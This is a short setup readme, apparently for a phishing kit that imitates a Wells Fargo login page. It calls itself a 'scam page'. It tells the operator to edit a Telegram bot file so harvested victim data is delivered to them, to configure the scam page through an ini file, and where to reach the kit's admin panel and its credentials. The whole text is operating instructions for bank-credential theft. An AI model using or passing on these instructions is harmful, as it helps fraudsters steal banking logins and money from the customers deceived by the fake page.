<<<<<<<<<< ---------- ---------->>>>>>>>>>


edit the settings/tel_bot.php file to receive results on telegram 

edit the Exec.ini to edit the scam page configuration.

<<<<<<<<<< ---------- ---------->>>>>>>>>>

you can find the admin panel in /Dashboard

Like:
if your scam page link is : www.domain.com/wellsfargo
Your admin panel link will be : www.domain.com/wellsfargo/Dashboard/
You can find admin panel credentials in exec.ini file 